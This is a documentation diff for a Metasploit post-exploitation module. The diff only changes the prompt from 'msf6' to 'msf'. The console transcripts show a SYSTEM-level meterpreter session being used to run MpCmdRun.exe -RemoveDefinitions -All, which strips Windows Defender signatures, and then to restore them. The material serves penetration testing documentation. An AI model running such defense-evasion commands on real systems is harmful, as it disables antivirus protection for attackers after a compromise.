@@ -29,7 +29,7 @@ Updates the Windows Defender signature definitions to the latest versions availa
 ## Scenarios
 ### ROLLBACK Action on Windows Server 2022
 ```
-msf6 > sessions
+msf > sessions
 
 Active sessions
 ===============
@@ -39,10 +39,10 @@ Active sessions
   1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ WIN-BR0CCBA815B  172.28.94.235:45437 -> 172.28.82.203:4444 (172.28
                                                                             .82.203)
 
-msf6 > use post/windows/manage/rollback_defender_signatures 
-msf6 post(windows/manage/rollback_defender_signatures) > set SESSION 1 
+msf > use post/windows/manage/rollback_defender_signatures 
+msf post(windows/manage/rollback_defender_signatures) > set SESSION 1 
 SESSION => 1
-msf6 post(windows/manage/rollback_defender_signatures) > show options
+msf post(windows/manage/rollback_defender_signatures) > show options
 
 Module options (post/windows/manage/rollback_defender_signatures):
 
@@ -58,7 +58,7 @@ Post action:
    ROLLBACK  Rollback Defender signatures
 
 
-msf6 post(windows/manage/rollback_defender_signatures) > run
+msf post(windows/manage/rollback_defender_signatures) > run
 
 [*] Removing all definitions for Windows Defender
 [*] Running cmd.exe /c "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
@@ -71,12 +71,12 @@ AntiVirus Signature Version: 1.375.652.0
 Starting engine and signature rollback to none...
 Done!
 [*] Post module execution completed
-msf6 post(windows/manage/rollback_defender_signatures) > 
+msf post(windows/manage/rollback_defender_signatures) > 
 ```
 
 ## UPDATE Action on Windows Server 2022
 ```
-msf6 > sessions
+msf > sessions
 
 Active sessions
 ===============
@@ -86,12 +86,12 @@ Active sessions
   1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ WIN-BR0CCBA815B  172.28.94.235:45437 -> 172.28.82.203:4444 (172.28
                                                                             .82.203)
 
-msf6 > use post/windows/manage/rollback_defender_signatures 
-msf6 post(windows/manage/rollback_defender_signatures) > set SESSION 1 
+msf > use post/windows/manage/rollback_defender_signatures 
+msf post(windows/manage/rollback_defender_signatures) > set SESSION 1 
 SESSION => 1
-msf6 post(windows/manage/rollback_defender_signatures) > set ACTION UPDATE 
+msf post(windows/manage/rollback_defender_signatures) > set ACTION UPDATE 
 ACTION => UPDATE
-msf6 post(windows/manage/rollback_defender_signatures) > show options
+msf post(windows/manage/rollback_defender_signatures) > show options
 
 Module options (post/windows/manage/rollback_defender_signatures):
 
@@ -107,7 +107,7 @@ Post action:
    UPDATE  Update Defender signatures
 
 
-msf6 post(windows/manage/rollback_defender_signatures) > run
+msf post(windows/manage/rollback_defender_signatures) > run
 
 [*] Updating definitions for Windows Defender
 [*] Running cmd.exe /c "C:\Program Files\Windows Defender\MpCmdRun.exe" -SignatureUpdate
@@ -118,5 +118,5 @@ AntiSpyware Signature Version: 1.375.652.0
 AntiVirus Signature Version: 1.375.652.0
 Signature update finished. No updates needed
 [*] Post module execution completed
-msf6 post(windows/manage/rollback_defender_signatures) > 
+msf post(windows/manage/rollback_defender_signatures) > 
 ```
